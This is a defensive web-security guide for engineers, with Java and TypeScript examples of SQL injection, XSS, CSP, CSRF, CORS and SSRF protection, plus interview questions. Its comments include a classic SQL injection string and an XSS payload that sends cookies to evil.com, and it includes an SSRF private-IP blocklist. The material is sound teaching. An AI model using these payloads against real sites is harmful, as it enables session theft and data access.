# Web Application Security

Web application security encompasses the practices, protocols, and mechanisms that protect web applications from attacks exploiting vulnerabilities in code, configuration, or architecture. Understanding web security is non-negotiable for any engineer building production systems, as a single vulnerability can expose millions of user records, enable financial fraud, or destroy organizational trust. The OWASP Top 10 provides a widely accepted framework for categorizing the most critical web application security risks and forms the foundation of most security interview discussions.

Modern web applications face an ever-expanding attack surface: single-page applications execute complex logic client-side, APIs serve multiple consumers with varying trust levels, and third-party dependencies introduce supply chain risks. This guide covers the essential attack vectors — XSS, CSRF, SQL injection — alongside the defensive mechanisms — CSP, CORS, input validation — that every production system must implement.

---

## Quick Reference

- **XSS (Cross-Site Scripting)** — Injection of malicious scripts into web pages viewed by other users; mitigated by output encoding and Content Security Policy
- **CSRF (Cross-Site Request Forgery)** — Forcing authenticated users to submit unintended requests; mitigated by anti-CSRF tokens and SameSite cookies
- **SQL Injection** — Inserting malicious SQL through unsanitized input; mitigated by parameterized queries and ORM usage
- **Content Security Policy (CSP)** — HTTP header restricting which resources a browser can load, reducing XSS attack surface significantly
- **CORS (Cross-Origin Resource Sharing)** — Browser mechanism controlling which origins can access your API; misconfiguration exposes APIs to unauthorized domains
- **Input Validation** — Server-side validation of all user input is the first line of defense against injection attacks
- **Rate Limiting** — Throttles request frequency to prevent brute-force attacks and denial-of-service
- **HTTPS/TLS** — Encrypts data in transit; prevents eavesdropping, tampering, and man-in-the-middle attacks
- **Security Headers** — HTTP response headers (X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security) that harden browser behavior
- **Subresource Integrity (SRI)** — Cryptographic verification that CDN-hosted scripts haven't been tampered with

---

## When to Use

Security considerations apply to every web application, but certain scenarios demand heightened attention and specific security patterns.

**Apply rigorous web security practices when:**

- Building authentication and session management systems where credential theft enables account takeover
- Handling user-generated content that will be rendered in browsers, creating XSS attack vectors
- Designing APIs that accept external input, which may contain injection payloads
- Processing financial transactions where tampering could result in monetary loss
- Storing personally identifiable information (PII) subject to regulatory requirements like GDPR or HIPAA
- Integrating with third-party services where trust boundaries must be explicitly defined
- Building multi-tenant systems where data isolation failures expose one customer's data to another
- Deploying to public cloud infrastructure where misconfigured access controls are the leading cause of breaches
- Serving content from CDNs where script integrity must be verified
- Implementing webhooks or callback URLs that could be exploited for SSRF attacks

**Security is not a feature you add later.** It must be woven into the design from the start. Retrofitting security into an existing application is orders of magnitude more expensive than building it in from day one. Every code review should include a security lens, and every architecture decision should consider the threat model.

---

## Code Examples

### Example 1: Preventing SQL Injection with Parameterized Queries

```java
// VULNERABLE: String concatenation allows SQL injection
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    // Attacker input: ' OR '1'='1' --
    // Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
    return jdbcTemplate.queryForObject(query, new UserRowMapper());
}

// SECURE: Parameterized query prevents injection
public User findUserSecure(String username) {
    String query = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.queryForObject(query, new UserRowMapper(), username);
}

// SECURE: Using JPA/Hibernate named parameters
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// SECURE: Using Criteria API for dynamic queries
public List<User> searchUsers(String name, String email) {
    CriteriaBuilder cb = entityManager.getCriteriaBuilder();
    CriteriaQuery<User> query = cb.createQuery(User.class);
    Root<User> root = query.from(User.class);

    List<Predicate> predicates = new ArrayList<>();
    if (name != null) {
        predicates.add(cb.like(root.get("name"), cb.parameter(String.class, "name")));
    }
    if (email != null) {
        predicates.add(cb.equal(root.get("email"), cb.parameter(String.class, "email")));
    }

    query.where(predicates.toArray(new Predicate[0]));
    TypedQuery<User> typedQuery = entityManager.createQuery(query);
    if (name != null) typedQuery.setParameter("name", "%" + name + "%");
    if (email != null) typedQuery.setParameter("email", email);

    return typedQuery.getResultList();
}
```

The parameterized approach treats user input as data rather than executable SQL. The database driver handles escaping, making it impossible for an attacker to break out of the parameter context regardless of what characters they submit. Even dynamic queries built with Criteria API maintain parameterization.

### Example 2: XSS Prevention with Output Encoding and CSP

```typescript
// VULNERABLE: Directly inserting user content into DOM
function renderComment(comment: string): string {
  return `<div class="comment">${comment}</div>`;
  // Attacker input: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
}

// SECURE: HTML entity encoding before rendering
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function renderCommentSecure(comment: string): string {
  return `<div class="comment">${escapeHtml(comment)}</div>`;
}

// SECURE: React automatically escapes by default
function Comment({ text }: { text: string }) {
  return <div className="comment">{text}</div>; // Safe: React escapes
  // DANGEROUS: <div dangerouslySetInnerHTML={{ __html: text }} /> // Bypasses escaping
}

// SECURE: DOMPurify for cases where HTML rendering is required
import DOMPurify from 'dompurify';

function RichComment({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### Example 3: Content Security Policy Implementation

```typescript
// Express.js middleware for CSP headers
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-${generateNonce()}'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Consider using nonces for styles too
      imgSrc: ["'self'", "data:", "https://cdn.example.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'none'"],
      frameSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: [],
    },
    reportOnly: false, // Set to true during initial deployment
  })
);

// Nonce generation for inline scripts
import crypto from 'crypto';

function generateNonce(): string {
  return crypto.randomBytes(16).toString('base64');
}

// In your HTML template, use the nonce:
// <script nonce="${nonce}">/* trusted inline script */</script>
```

### Example 4: CSRF Protection with Double-Submit Cookie Pattern

```java
// Spring Security CSRF configuration
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
            )
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self'"))
                .frameOptions(frame -> frame.deny())
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000))
            );
        return http.build();
    }
}
```

```typescript
// Frontend: Including CSRF token in requests with Axios interceptor
import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true,
});

// Automatically include CSRF token from cookie
api.interceptors.request.use((config) => {
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('XSRF-TOKEN='))
    ?.split('=')[1];

  if (csrfToken && config.method !== 'get') {
    config.headers['X-XSRF-TOKEN'] = decodeURIComponent(csrfToken);
  }
  return config;
});

// Usage
async function transferFunds(amount: number, recipient: string) {
  return api.post('/transfer', { amount, recipient });
}
```

### Example 5: CORS Configuration for Production APIs

```typescript
// Express.js CORS configuration - production-grade
import cors from 'cors';

const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com',
];

const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, curl, server-to-server)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-XSRF-TOKEN'],
  credentials: true,
  maxAge: 86400, // Preflight cache: 24 hours
  exposedHeaders: ['X-Total-Count', 'X-Request-Id'],
};

app.use(cors(corsOptions));

// NEVER do this in production:
// app.use(cors({ origin: '*', credentials: true })); // Contradictory and insecure
```

### Example 6: Server-Side Request Forgery (SSRF) Prevention

```typescript
import { URL } from 'url';
import dns from 'dns/promises';
import net from 'net';

// SSRF-safe URL fetching
async function safeFetch(userUrl: string): Promise<Response> {
  const parsed = new URL(userUrl);

  // Block private/internal networks
  const blockedProtocols = ['file:', 'ftp:', 'gopher:', 'data:'];
  if (blockedProtocols.includes(parsed.protocol)) {
    throw new Error('Protocol not allowed');
  }

  // Resolve DNS and check for internal IPs
  const addresses = await dns.resolve4(parsed.hostname);
  for (const addr of addresses) {
    if (isPrivateIP(addr)) {
      throw new Error('Internal addresses not allowed');
    }
  }

  // Proceed with fetch using resolved IP
  return fetch(userUrl, {
    redirect: 'manual', // Don't follow redirects automatically
    signal: AbortSignal.timeout(5000),
  });
}

function isPrivateIP(ip: string): boolean {
  const parts = ip.split('.').map(Number);
  return (
    parts[0] === 10 ||
    (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
    (parts[0] === 192 && parts[1] === 168) ||
    parts[0] === 127 ||
    (parts[0] === 169 && parts[1] === 254)
  );
}
```

---

## Common Pitfalls

**1. Relying solely on client-side validation.** Client-side checks improve UX but provide zero security. An attacker can bypass any browser-based validation by sending requests directly to your API using curl, Postman, or a custom script. All validation must be duplicated server-side.

**2. Storing sensitive data in localStorage.** localStorage is accessible to any JavaScript running on the page, making it vulnerable to XSS attacks. If an attacker injects a script, they can exfiltrate tokens stored in localStorage. Use httpOnly cookies for session tokens instead, which are inaccessible to JavaScript.

**3. Overly permissive CORS configuration.** Setting `Access-Control-Allow-Origin: *` on authenticated endpoints allows any website to make requests to your API. Always whitelist specific trusted origins and never reflect the Origin header without validation. Combining `*` with `credentials: true` is actually blocked by browsers, but reflecting arbitrary origins with credentials is equally dangerous.

**4. Failing to implement rate limiting on authentication endpoints.** Without rate limiting, attackers can attempt millions of password combinations. Implement exponential backoff, account lockout after N failures, and CAPTCHA challenges for suspicious patterns. Use sliding window algorithms rather than fixed windows to prevent burst attacks at window boundaries.

**5. Logging sensitive data.** Accidentally logging passwords, tokens, credit card numbers, or PII creates a secondary attack vector. If logs are compromised, all logged secrets are exposed. Implement structured logging with explicit field allowlists and use log scrubbing libraries to redact sensitive patterns.

**6. Not rotating secrets and credentials.** Static API keys, database passwords, and encryption keys accumulate risk over time. Implement automated rotation with tools like HashiCorp Vault or AWS Secrets Manager, and design systems to handle rotation without downtime using dual-key periods.

**7. Trusting the Referer header for security decisions.** The Referer header can be spoofed or stripped by privacy extensions. Never use it as the sole CSRF defense. Combine it with proper CSRF tokens for defense in depth.

**8. Implementing custom cryptography or encoding.** Rolling your own encryption, hashing, or token generation almost always introduces vulnerabilities. Use well-audited libraries (bcrypt, argon2, libsodium) and established protocols (OAuth 2.0, TLS 1.3) instead.

**9. Missing security headers on API responses.** Even JSON APIs should include security headers like `X-Content-Type-Options: nosniff` to prevent MIME-type sniffing attacks, and `Cache-Control: no-store` for sensitive data to prevent caching of authenticated responses.

---

## Real-World Use Cases

**E-commerce payment processing:** Payment systems implement multiple security layers including PCI DSS compliance, tokenization of card numbers, 3D Secure authentication, and fraud detection algorithms. The payment form is typically hosted in an iframe from the payment processor's domain, isolating sensitive card data from the merchant's JavaScript context entirely. CSP headers ensure only the payment processor's frame can be embedded, and SRI tags verify the integrity of any payment SDK scripts loaded from CDNs.

**Healthcare data platforms:** HIPAA-regulated systems implement role-based access control with audit logging of every data access, encryption at rest and in transit, automatic session timeout, and break-glass procedures for emergency access. Data is segmented by patient, and cross-patient queries require elevated privileges with mandatory justification. XSS prevention is critical because a compromised browser session could expose protected health information.

**Multi-tenant SaaS applications:** Tenant isolation is enforced at the database level (row-level security or separate schemas), the API level (tenant ID validation on every request), and the infrastructure level (separate encryption keys per tenant). CORS policies are configured per-tenant to allow only that tenant's custom domain. CSRF protection ensures that a malicious page cannot perform actions in another tenant's context.

**Banking and financial services:** Financial applications implement transaction signing, mutual TLS for service-to-service communication, hardware security modules (HSMs) for key storage, and real-time anomaly detection. Every transaction is logged immutably for regulatory compliance and forensic analysis. Content Security Policy is enforced strictly to prevent any script injection that could modify transaction amounts or redirect payments.

**Social media platforms:** User-generated content creates massive XSS attack surface. Platforms like Twitter and Facebook implement aggressive content sanitization, CSP with strict nonce-based policies, and sandboxed iframes for embedded content. Rate limiting prevents automated spam and credential stuffing attacks against login endpoints.

---

## Interview Questions

**Q: Explain the difference between stored XSS, reflected XSS, and DOM-based XSS. Which is most dangerous and why?**

A: Stored XSS persists the malicious payload in the database (e.g., a forum comment containing a script), affecting every user who views the content. Reflected XSS includes the payload in the URL or request parameters, requiring the attacker to trick a victim into clicking a crafted link. DOM-based XSS occurs entirely client-side when JavaScript reads attacker-controlled data (like `location.hash`) and inserts it into the DOM without sanitization. Stored XSS is generally most dangerous because it requires no social engineering after the initial injection, it scales to all users who view the affected content, and it persists until explicitly removed. However, DOM-based XSS can be harder to detect because the payload never reaches the server, bypassing server-side WAF rules and logging.

**Q: How does Content Security Policy (CSP) prevent XSS attacks? What are the challenges of implementing CSP in a large application?**

A: CSP is an HTTP response header that tells the browser which sources of content are trusted. For example, `script-src 'self'` only allows scripts from the same origin, blocking inline scripts and scripts from attacker-controlled domains. Even if an attacker injects a `<script>` tag via XSS, the browser refuses to execute it because the source violates the policy. The challenges in large applications include: legacy code using inline scripts and event handlers that require `'unsafe-inline'` (defeating the purpose), third-party widgets and analytics that need explicit domain allowlisting, dynamically generated content that requires nonces or hashes, and the difficulty of testing CSP in development without breaking functionality. The recommended approach is to deploy in report-only mode first, analyze violations, and tighten the policy incrementally.

**Q: How would you design a secure session management system? What are the trade-offs between cookie-based sessions and JWTs?**

A: Cookie-based sessions store a random session ID in an httpOnly, Secure, SameSite cookie, with session data stored server-side (Redis or database). JWTs encode claims directly in the token, eliminating server-side state. Cookie sessions are revocable instantly (delete from store), have smaller payload size, and are immune to client-side token theft via XSS (httpOnly). JWTs are stateless (no shared session store needed), work across domains, and scale horizontally without session affinity. The trade-offs: JWTs cannot be revoked before expiry without maintaining a blacklist (reintroducing state), they grow large with many claims, and if stolen they remain valid. For most applications, short-lived JWTs (15 minutes) paired with httpOnly refresh tokens stored in cookies provide a reasonable balance of statelessness and security.

**Q: Explain CORS. Why does the browser enforce it, and how can misconfiguration lead to security vulnerabilities?**

A: CORS is a browser-enforced mechanism that restricts cross-origin HTTP requests. Without CORS, the Same-Origin Policy blocks JavaScript from reading responses from different origins. CORS relaxes this by allowing servers to declare which origins are trusted via the `Access-Control-Allow-Origin` header. The browser enforces it (not the server) because the threat model is protecting the user's authenticated session from malicious websites. Misconfiguration vulnerabilities include: reflecting any Origin header back as allowed (allows any site to read responses), combining wildcard origins with credentials (browsers block this, but developers work around it incorrectly), and allowing `null` origin (exploitable via sandboxed iframes and data: URLs). A properly configured CORS policy whitelists specific trusted origins and never dynamically reflects untrusted input.

**Q: What is SSRF and how do you prevent it in a web application that needs to fetch user-provided URLs?**

A: Server-Side Request Forgery (SSRF) occurs when an attacker tricks the server into making requests to internal resources (metadata endpoints, internal APIs, databases) by providing a malicious URL. Prevention requires: validating the URL scheme (allow only http/https), resolving DNS and checking the resulting IP against blocklists of private ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x), disabling automatic redirect following (redirects can bypass IP checks), implementing network-level controls (egress firewall rules), and using allowlists when possible. Cloud environments are especially vulnerable because the instance metadata endpoint (169.254.169.254) can expose IAM credentials.

---

## Production Tips

**Implement defense in depth.** Never rely on a single security control. Layer multiple defenses: input validation at the API boundary, parameterized queries at the data layer, output encoding at the presentation layer, CSP headers as a browser-level backstop, and WAF rules at the network edge. When one layer fails, others contain the blast radius. Each layer should assume the previous layer has been bypassed.

**Automate dependency vulnerability scanning.** Use tools like Snyk, Dependabot, or OWASP Dependency-Check in your CI pipeline to detect known vulnerabilities in third-party libraries. Pin dependency versions, review changelogs before upgrading, and have a process for emergency patching when critical CVEs are published. The majority of production breaches exploit known vulnerabilities in unpatched dependencies rather than novel zero-days.

**Implement comprehensive security logging and monitoring.** Log all authentication events (successes and failures), authorization denials, input validation failures, and anomalous patterns. Feed these into a SIEM system with alerting rules for brute-force attempts, impossible travel (login from two distant locations within minutes), and privilege escalation patterns. Without visibility, you cannot detect breaches in progress.

**Deploy CSP in report-only mode before enforcing.** Use `Content-Security-Policy-Report-Only` with a reporting endpoint to collect violation data without breaking functionality. Analyze reports for 2-4 weeks to identify legitimate resources that need allowlisting, then switch to enforcement mode. This prevents the common failure mode of deploying CSP and immediately breaking production features.

---

## Related Topics

- [Authentication Patterns](./authentication-patterns.md) — OAuth 2.0, JWT, and session management patterns that complement web security defenses
- [Cryptography Fundamentals](./cryptography-fundamentals.md) — The encryption and hashing primitives that underpin TLS, token signing, and password storage
- [Network Security](./network-security.md) — Network-level protections including WAFs, DDoS mitigation, and TLS termination
- [Spring Security](../../backend/spring-framework/spring-security.md) — Framework-specific implementation of authentication, authorization, and CSRF protection in Java applications
